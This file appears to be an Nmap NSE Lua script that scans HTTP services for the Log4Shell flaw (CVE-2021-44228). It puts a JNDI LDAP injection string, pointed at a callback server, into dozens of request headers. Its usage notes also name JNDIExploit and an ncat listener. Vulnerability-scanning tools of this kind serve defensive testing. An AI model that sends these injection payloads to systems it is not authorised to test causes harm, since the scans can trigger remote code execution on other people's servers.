description = [[
Log4Shell - CVE-2021-44228

CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2.
An unauthenticated, remote attacker could exploit this flaw by sending a specially
crafted request to a server running a vulnerable version of log4j. The crafted
request uses a Java Naming and Directory Interface (JNDI) injection via a variety
of services including:

    -  Lightweight Directory Access Protocol (LDAP)
    -  Secure LDAP (LDAPS)
    -  Remote Method Invocation (RMI)
    -  Domain Name Service (DNS)

If the vulnerable server uses log4j to log requests, the exploit will then request
a malicious payload over JNDI through one of the services above from an
attacker-controlled server. Successful exploitation could lead to RCE.

Usage

Method A:
    - Download JNDIExploit from GitHub (https://github.com/feihong-cs/JNDIExploit)

    - Start JNDIExploit server:
        java -jar JNDIExploit.jar

    - Run Nmap with --script log4shell.nse script
        nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

    - See JNDIExploit output for see the received LDAP query (log4shell/{target host}/{target port})
        [+] Received LDAP Query: log4shell/127.0.0.1/8080
        [!] Invalid LDAP Query: log4shell/127.0.0.1/8080

Method B:
    - Listen a TCP port with netcat (or ncat):
        ncat -v -k -e /bin/true -l 1389

    - Run Nmap with --script log4shell.nse script
        nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

    - See the target IP address in netcat (or ncat) output:
        Ncat: Connection from 172.17.0.2.
        Ncat: Connection from 172.17.0.2:38898.

]]

author     = 'giuseppe DOT diterlizzi AT nttdata DOT com'
license    = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe", "external"}

---
-- @usage
-- nmap --script log4shell [--script-args log4shell.callback-server=127.0.0.1:1389] -p <port> <host>
-- @args log4shell.callback-server JNDIExploit host port
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | log4shell: 
-- |   (!) Sended payload ${jndi:ldap://172.17.42.1:13890/log4shell/127.0.0.1/8080} using X-Api-Version header.
-- |   For confirmation see 172.17.42.1:13890 server log
-- |_  [...]
-- @changelog
-- 2021-12-11   First release
-- 2021-12-13   Test all headers known
--              Changed output format
--              Added log4shell.callback-server arg (instead of log4shell.exploit-server)
--

local http      = require "http"
local json      = require "json"
local string    = require "string"
local table     = require "table"
local nmap      = require "nmap"
local stdnse    = require "stdnse"
local shortport = require "shortport"

portrule = shortport.http

action = function(host, port)

  local output = {}

  local callback_server = stdnse.get_script_args('log4shell.callback-server') or stdnse.get_script_args('log4shell.exploit-server') or '127.0.0.1:1389'
  local exploit_payload = string.format('${jndi:ldap://%s/log4shell/%s/%s}', callback_server, host.ip, port.number)

  local payload_headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}

  for i, payload_header in ipairs(payload_headers) do

    stdnse.debug1(string.format('%s --> %s', payload_header, exploit_payload))

    local option = {
      header = {
        [payload_header] = exploit_payload
      }
    }

    stdnse.debug1(exploit_payload)

    local response = http.get(host, port.number, '/', option)
    local status   = response.status
    local continue = false

    if status == nil then
      -- Something went really wrong out there
      -- According to the NSE way we will die silently rather than spam user with error messages
    elseif status ~= 200 then
      -- Again just die silently
    end

      if status >= 200 then
        table.insert(output, string.format('(!) Sended payload %s using %s header.\nFor confirmation see %s server log', exploit_payload, payload_header, callback_server))
      end

  end

  return stdnse.format_output(true, output)

end
